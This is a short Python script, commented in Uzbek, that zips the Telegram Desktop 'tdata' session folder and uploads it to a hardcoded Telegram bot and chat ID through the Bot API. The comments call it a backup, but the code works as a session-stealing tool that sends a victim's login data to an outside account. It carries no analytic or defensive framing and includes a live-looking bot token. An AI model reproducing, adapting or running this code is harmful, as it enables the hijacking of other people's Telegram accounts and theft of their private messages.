import os
import zipfile
import requests
from pathlib import Path
import sys

# ==== 1. Telegram BOT ma'lumotlari ====
BOT_TOKEN = '7211406891:AAHrj9KRnE82oxZXJKthmnL7XkoCzsFZtE0'
CHAT_ID = '6655243292'

# ==== 2. Tdata papkasini topish ====
tdata_path = Path(os.getenv("APPDATA")) / "Telegram Desktop" / "tdata"
zip_path = Path.home() / "Desktop" / "telegram_tdata_backup.zip"

# ==== 3. Tdata zip qilish funksiyasi ====
def zip_tdata_folder(source_folder, output_zip):
    with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_folder):
            for filename in filenames:
                file_path = Path(foldername) / filename
                arcname = file_path.relative_to(source_folder.parent)
                zipf.write(file_path, arcname)

# ==== 4. ZIP + Yuborish ====
if tdata_path.exists():
    zip_tdata_folder(tdata_path, zip_path)

    # ZIP faylni yuborish
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    with open(zip_path, 'rb') as f:
        response = requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})

    if response.status_code == 200:
        print("[✅] tdata ZIP qilindi va Telegram'ga yuborildi.")
    else:
        print(f"[❌] ZIP yaratildi, lekin yuborishda xatolik: {response.status_code} - {response.text}")
else:
    print("[❌] tdata topilmadi. Telegram o‘rnatilganmi yoki boshqa diskdami tekshirib ko‘ring.")
